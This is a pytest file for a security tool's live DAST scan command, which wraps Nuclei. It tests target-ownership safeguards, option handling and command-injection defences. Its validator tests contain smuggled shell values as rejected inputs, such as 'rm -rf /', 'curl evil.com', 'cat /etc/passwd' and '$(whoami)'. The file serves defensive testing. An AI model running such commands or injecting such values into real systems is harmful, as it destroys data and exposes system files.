"""Tests for live DAST scanning command."""

from unittest.mock import AsyncMock, MagicMock, patch

from typer.testing import CliRunner

from vibeguard.cli.live_cmd import (
    _validate_severity,
    _validate_tags,
    _validate_template_path,
)
from vibeguard.cli.main import app
from vibeguard.core.exit_codes import ExitCode

runner = CliRunner()


class TestLiveCommandSafety:
    """Test safety checks in the live command."""

    def test_localhost_scan_allowed_without_flag(self) -> None:
        """Test that localhost scans work without --i-own-this."""
        with patch("vibeguard.cli.live_cmd.LocalRunner") as mock_runner_class:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = False
            mock_runner_class.return_value = mock_runner

            result = runner.invoke(app, ["live", "http://localhost:8080"])
            # Should fail because nuclei not installed, but not because of safety
            assert "Non-localhost targets require --i-own-this" not in result.output

    def test_127_0_0_1_allowed_without_flag(self) -> None:
        """Test that 127.0.0.1 scans work without --i-own-this."""
        with patch("vibeguard.cli.live_cmd.LocalRunner") as mock_runner_class:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = False
            mock_runner_class.return_value = mock_runner

            result = runner.invoke(app, ["live", "http://127.0.0.1:3000"])
            assert "Non-localhost targets require --i-own-this" not in result.output

    def test_external_url_blocked_without_flag(self) -> None:
        """Test that external URLs are blocked without --i-own-this."""
        result = runner.invoke(app, ["live", "https://example.com"])
        assert result.exit_code == ExitCode.CONFIG_ERROR
        assert "--i-own-this" in result.output

    def test_external_url_with_flag_prompts(self) -> None:
        """Test that external URLs with --i-own-this prompt for confirmation."""
        # When running non-interactively, the prompt will fail, but we should
        # at least get past the initial check
        with patch("vibeguard.cli.live_cmd.LocalRunner") as mock_runner_class:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = False
            mock_runner_class.return_value = mock_runner

            # Use --quiet to skip the confirmation prompt
            result = runner.invoke(
                app, ["live", "https://example.com", "--i-own-this", "--quiet"]
            )
            # Should fail because nuclei not installed, not because of safety
            assert "Nuclei is not installed" in result.output

    def test_private_ip_blocked_without_flag(self) -> None:
        """Test that private IPs are blocked without --i-own-this."""
        result = runner.invoke(app, ["live", "http://192.168.1.1:8080"])
        assert result.exit_code == ExitCode.CONFIG_ERROR
        assert "--i-own-this" in result.output

    def test_localhost_subdomain_allowed_when_dns_verifies(self) -> None:
        """Test that app.localhost is allowed when DNS verifies it resolves to loopback.

        SECURITY: .localhost domains now require DNS verification.
        """
        with patch("vibeguard.cli.live_cmd.LocalRunner") as mock_runner_class, \
             patch("vibeguard.core.url_validator.socket.getaddrinfo") as mock_dns:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = False
            mock_runner_class.return_value = mock_runner
            # Mock DNS to return loopback
            mock_dns.return_value = [(2, 1, 0, "", ("127.0.0.1", 0))]

            result = runner.invoke(app, ["live", "http://app.localhost:3000"])
            assert "Non-localhost targets require --i-own-this" not in result.output

    def test_localhost_subdomain_blocked_without_dns(self) -> None:
        """Test that app.localhost is blocked when DNS doesn't resolve to loopback.

        SECURITY: .localhost domains that don't resolve to loopback require --i-own-this.
        """
        with patch("vibeguard.core.url_validator.socket.getaddrinfo") as mock_dns:
            # Mock DNS resolution failure
            mock_dns.side_effect = OSError("Name resolution failed")

            result = runner.invoke(app, ["live", "http://malicious.localhost:3000"])
            assert "--i-own-this" in result.output


class TestLiveCommandOptions:
    """Test command line options."""

    def test_rate_limit_option(self) -> None:
        """Test --rate-limit option is passed to command."""
        with patch("vibeguard.cli.live_cmd.LocalRunner") as mock_runner_class, \
             patch("vibeguard.cli.live_cmd._run_subprocess_exec") as mock_exec:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = True
            mock_runner.get_binary_path.return_value = "nuclei"
            mock_runner_class.return_value = mock_runner
            mock_exec.return_value = {"stdout": "", "stderr": "", "exit_code": 0, "error": None}

            runner.invoke(
                app, ["live", "http://localhost:8080", "--rate-limit", "10", "-q"]
            )

            # Check that rate-limit was passed as argument
            call_args = mock_exec.call_args[0][0]  # First positional arg is cmd_args list
            assert "-rate-limit" in call_args
            assert "10" in call_args

    def test_timeout_option(self) -> None:
        """Test --timeout option is passed to command."""
        with patch("vibeguard.cli.live_cmd.LocalRunner") as mock_runner_class, \
             patch("vibeguard.cli.live_cmd._run_subprocess_exec") as mock_exec:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = True
            mock_runner.get_binary_path.return_value = "nuclei"
            mock_runner_class.return_value = mock_runner
            mock_exec.return_value = {"stdout": "", "stderr": "", "exit_code": 0, "error": None}

            runner.invoke(
                app, ["live", "http://localhost:8080", "--timeout", "30", "-q"]
            )

            call_args = mock_exec.call_args[0][0]
            assert "-timeout" in call_args
            assert "30" in call_args

    def test_tags_option(self) -> None:
        """Test --tags option is passed to command."""
        with patch("vibeguard.cli.live_cmd.LocalRunner") as mock_runner_class, \
             patch("vibeguard.cli.live_cmd._run_subprocess_exec") as mock_exec:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = True
            mock_runner.get_binary_path.return_value = "nuclei"
            mock_runner_class.return_value = mock_runner
            mock_exec.return_value = {"stdout": "", "stderr": "", "exit_code": 0, "error": None}

            runner.invoke(
                app, ["live", "http://localhost:8080", "--tags", "cve,xss", "-q"]
            )

            call_args = mock_exec.call_args[0][0]
            assert "-tags" in call_args
            assert "cve,xss" in call_args

    def test_severity_filter_option(self) -> None:
        """Test --severity option is passed to command."""
        with patch("vibeguard.cli.live_cmd.LocalRunner") as mock_runner_class, \
             patch("vibeguard.cli.live_cmd._run_subprocess_exec") as mock_exec:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = True
            mock_runner.get_binary_path.return_value = "nuclei"
            mock_runner_class.return_value = mock_runner
            mock_exec.return_value = {"stdout": "", "stderr": "", "exit_code": 0, "error": None}

            runner.invoke(
                app, ["live", "http://localhost:8080", "--severity", "critical,high", "-q"]
            )

            call_args = mock_exec.call_args[0][0]
            assert "-severity" in call_args
            assert "critical,high" in call_args

    def test_excluded_tags_always_present(self) -> None:
        """Test that dangerous tags are always excluded."""
        with patch("vibeguard.cli.live_cmd.LocalRunner") as mock_runner_class, \
             patch("vibeguard.cli.live_cmd._run_subprocess_exec") as mock_exec:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = True
            mock_runner.get_binary_path.return_value = "nuclei"
            mock_runner_class.return_value = mock_runner
            mock_exec.return_value = {"stdout": "", "stderr": "", "exit_code": 0, "error": None}

            runner.invoke(app, ["live", "http://localhost:8080", "-q"])

            call_args = mock_exec.call_args[0][0]
            assert "-exclude-tags" in call_args
            assert "dos,intrusive,bruteforce,fuzzing" in call_args


class TestLiveCommandOutput:
    """Test output formatting."""

    def test_json_output_format(self) -> None:
        """Test --output json produces valid JSON."""
        import json

        mock_finding = {
            "template-id": "test-vuln",
            "info": {
                "name": "Test Vulnerability",
                "severity": "high",
                "tags": ["xss"],
            },
            "host": "http://localhost:8080",
            "matched-at": "http://localhost:8080/api",
        }

        with patch("vibeguard.cli.live_cmd.LocalRunner") as mock_runner_class, \
             patch("vibeguard.cli.live_cmd._run_subprocess_exec") as mock_exec:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = True
            mock_runner.get_binary_path.return_value = "nuclei"
            mock_runner_class.return_value = mock_runner
            mock_exec.return_value = {
                "stdout": json.dumps(mock_finding),
                "stderr": "",
                "exit_code": 0,
                "error": None,
            }

            result = runner.invoke(
                app, ["live", "http://localhost:8080", "--output", "json", "-q"]
            )

            # Should be valid JSON
            output_json = json.loads(result.output)
            assert isinstance(output_json, list)
            assert len(output_json) == 1
            assert output_json[0]["rule_id"] == "test-vuln"

    def test_exit_code_with_findings(self) -> None:
        """Test exit code is FINDINGS when vulnerabilities found."""
        import json

        mock_finding = {
            "template-id": "test-vuln",
            "info": {"name": "Test", "severity": "high", "tags": []},
            "host": "http://localhost:8080",
        }

        with patch("vibeguard.cli.live_cmd.LocalRunner") as mock_runner_class, \
             patch("vibeguard.cli.live_cmd._run_subprocess_exec") as mock_exec:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = True
            mock_runner.get_binary_path.return_value = "nuclei"
            mock_runner_class.return_value = mock_runner
            mock_exec.return_value = {
                "stdout": json.dumps(mock_finding),
                "stderr": "",
                "exit_code": 0,
                "error": None,
            }

            result = runner.invoke(app, ["live", "http://localhost:8080", "-q"])
            assert result.exit_code == ExitCode.FINDINGS

    def test_exit_code_no_findings(self) -> None:
        """Test exit code is SUCCESS when no vulnerabilities found."""
        with patch("vibeguard.cli.live_cmd.LocalRunner") as mock_runner_class, \
             patch("vibeguard.cli.live_cmd._run_subprocess_exec") as mock_exec:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = True
            mock_runner.get_binary_path.return_value = "nuclei"
            mock_runner_class.return_value = mock_runner
            mock_exec.return_value = {"stdout": "", "stderr": "", "exit_code": 0, "error": None}

            result = runner.invoke(app, ["live", "http://localhost:8080", "-q"])
            assert result.exit_code == ExitCode.SUCCESS


class TestLiveCommandValidation:
    """Test input validation."""

    def test_invalid_url_rejected(self) -> None:
        """Test that invalid URLs are rejected."""
        result = runner.invoke(app, ["live", ""])
        assert result.exit_code == ExitCode.CONFIG_ERROR
        assert "empty" in result.output.lower() or "Error" in result.output

    def test_missing_url_argument(self) -> None:
        """Test that missing URL shows error."""
        result = runner.invoke(app, ["live"])
        assert result.exit_code != 0
        assert "Missing argument" in result.output or "URL" in result.output

    def test_url_scheme_auto_added(self) -> None:
        """Test that http:// is auto-added if missing."""
        with patch("vibeguard.cli.live_cmd.LocalRunner") as mock_runner_class, \
             patch("vibeguard.cli.live_cmd._run_subprocess_exec") as mock_exec:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = True
            mock_runner.get_binary_path.return_value = "nuclei"
            mock_runner_class.return_value = mock_runner
            mock_exec.return_value = {"stdout": "", "stderr": "", "exit_code": 0, "error": None}

            runner.invoke(app, ["live", "localhost:8080", "-q"])

            call_args = mock_exec.call_args[0][0]
            assert "http://localhost:8080" in call_args


class TestLiveCommandNucleiAvailability:
    """Test Nuclei availability checks."""

    def test_nuclei_not_installed_error(self) -> None:
        """Test error message when Nuclei is not installed."""
        with patch("vibeguard.cli.live_cmd.LocalRunner") as mock_runner_class:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = False
            mock_runner_class.return_value = mock_runner

            result = runner.invoke(app, ["live", "http://localhost:8080"])
            assert result.exit_code == ExitCode.CONFIG_ERROR
            assert "Nuclei is not installed" in result.output

    def test_install_instructions_shown(self) -> None:
        """Test that install instructions are shown when Nuclei missing."""
        with patch("vibeguard.cli.live_cmd.LocalRunner") as mock_runner_class:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = False
            mock_runner_class.return_value = mock_runner

            result = runner.invoke(app, ["live", "http://localhost:8080"])
            assert "go install" in result.output or "brew install" in result.output


class TestLiveCommandHelp:
    """Test help text and documentation."""

    def test_help_shows_examples(self) -> None:
        """Test that help shows usage examples."""
        result = runner.invoke(app, ["live", "--help"])
        assert "localhost:8080" in result.output
        assert "--i-own-this" in result.output

    def test_help_shows_legal_notice(self) -> None:
        """Test that help shows legal warning."""
        result = runner.invoke(app, ["live", "--help"])
        assert "LEGAL" in result.output or "illegal" in result.output.lower()

    def test_experimental_flag_shown(self) -> None:
        """Test that EXPERIMENTAL label is shown."""
        result = runner.invoke(app, ["live", "--help"])
        assert "EXPERIMENTAL" in result.output


class TestCommandInjectionPrevention:
    """Security regression tests for command injection prevention.

    CRITICAL: These tests verify that user input cannot be used to inject
    shell commands through the live DAST scanning feature.
    """

    def test_validate_template_path_safe_paths(self) -> None:
        """Test that safe template paths are accepted."""
        assert _validate_template_path("templates/http") is True
        assert _validate_template_path("nuclei-templates/cves") is True
        assert _validate_template_path("./custom/templates") is True
        assert _validate_template_path("my-templates_v2") is True

    def test_validate_template_path_rejects_shell_metacharacters(self) -> None:
        """Test that shell metacharacters in template paths are rejected.

        REGRESSION: A malicious template path could execute arbitrary commands.
        """
        # Command separators
        assert _validate_template_path("templates; rm -rf /") is False
        assert _validate_template_path("templates && curl evil.com") is False
        assert _validate_template_path("templates | cat /etc/passwd") is False

        # Command substitution
        assert _validate_template_path("$(whoami)") is False
        assert _validate_template_path("`id`") is False

        # Quoting tricks
        assert _validate_template_path("templates'") is False
        assert _validate_template_path('templates"') is False

        # Redirects
        assert _validate_template_path("templates > /tmp/out") is False
        assert _validate_template_path("templates < /etc/passwd") is False

    def test_validate_tags_safe_tags(self) -> None:
        """Test that safe tags are accepted."""
        assert _validate_tags("cve") is True
        assert _validate_tags("cve,xss") is True
        assert _validate_tags("cve,xss,rce") is True
        assert _validate_tags("cve-2021") is True

    def test_validate_tags_rejects_injection(self) -> None:
        """Test that injection attempts in tags are rejected."""
        assert _validate_tags("cve; rm -rf /") is False
        assert _validate_tags("cve && whoami") is False
        assert _validate_tags("cve | cat /etc/passwd") is False
        assert _validate_tags("$(whoami)") is False

    def test_validate_severity_safe_values(self) -> None:
        """Test that safe severity values are accepted."""
        assert _validate_severity("critical") is True
        assert _validate_severity("critical,high") is True
        assert _validate_severity("critical,high,medium,low") is True

    def test_validate_severity_rejects_injection(self) -> None:
        """Test that injection attempts in severity are rejected."""
        assert _validate_severity("critical; whoami") is False
        assert _validate_severity("critical123") is False  # Numbers not allowed
        assert _validate_severity("$(id)") is False

    def test_malicious_template_path_rejected(self) -> None:
        """Test that CLI rejects malicious template paths."""
        with patch("vibeguard.cli.live_cmd.LocalRunner") as mock_runner_class:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = True
            mock_runner_class.return_value = mock_runner

            # Try to inject via template path
            result = runner.invoke(
                app,
                ["live", "http://localhost:8080", "--templates", "; curl evil.com", "-q"],
            )
            assert result.exit_code == ExitCode.CONFIG_ERROR
            assert "Invalid template path" in result.output

    def test_malicious_tags_rejected(self) -> None:
        """Test that CLI rejects malicious tags."""
        with patch("vibeguard.cli.live_cmd.LocalRunner") as mock_runner_class:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = True
            mock_runner_class.return_value = mock_runner

            # Try to inject via tags
            result = runner.invoke(
                app,
                ["live", "http://localhost:8080", "--tags", "cve;whoami", "-q"],
            )
            assert result.exit_code == ExitCode.CONFIG_ERROR
            assert "Invalid tags" in result.output

    def test_malicious_severity_rejected(self) -> None:
        """Test that CLI rejects malicious severity."""
        with patch("vibeguard.cli.live_cmd.LocalRunner") as mock_runner_class:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = True
            mock_runner_class.return_value = mock_runner

            # Try to inject via severity
            result = runner.invoke(
                app,
                ["live", "http://localhost:8080", "--severity", "$(id)", "-q"],
            )
            assert result.exit_code == ExitCode.CONFIG_ERROR
            assert "Invalid severity" in result.output

    def test_uses_subprocess_exec_not_shell(self) -> None:
        """Test that subprocess_exec is used instead of shell.

        REGRESSION: Using shell=True with user input enables command injection.
        """
        with patch("vibeguard.cli.live_cmd.LocalRunner") as mock_runner_class, \
             patch("vibeguard.cli.live_cmd.asyncio.create_subprocess_exec") as mock_exec:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = True
            mock_runner.get_binary_path.return_value = "nuclei"
            mock_runner_class.return_value = mock_runner

            # Mock the process
            mock_process = MagicMock()
            mock_process.communicate = AsyncMock(return_value=(b"", b""))
            mock_process.returncode = 0
            mock_exec.return_value = mock_process

            runner.invoke(app, ["live", "http://localhost:8080", "-q"])

            # Verify create_subprocess_exec was called (not create_subprocess_shell)
            mock_exec.assert_called_once()
            # Verify first argument is binary path, not a shell command string
            call_args = mock_exec.call_args[0]
            assert call_args[0] == "nuclei"

    def test_arguments_passed_as_list(self) -> None:
        """Test that command arguments are passed as a list, not joined string.

        SECURITY: Arguments must be passed as separate list elements to
        prevent shell interpretation of special characters.
        """
        with patch("vibeguard.cli.live_cmd.LocalRunner") as mock_runner_class, \
             patch("vibeguard.cli.live_cmd.asyncio.create_subprocess_exec") as mock_exec:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = True
            mock_runner.get_binary_path.return_value = "nuclei"
            mock_runner_class.return_value = mock_runner

            mock_process = MagicMock()
            mock_process.communicate = AsyncMock(return_value=(b"", b""))
            mock_process.returncode = 0
            mock_exec.return_value = mock_process

            runner.invoke(
                app, ["live", "http://localhost:8080", "--rate-limit", "10", "-q"]
            )

            # Verify arguments are separate list elements
            call_args = mock_exec.call_args[0]
            assert "-rate-limit" in call_args
            assert "10" in call_args
            # Verify they're NOT joined
            assert "-rate-limit 10" not in call_args
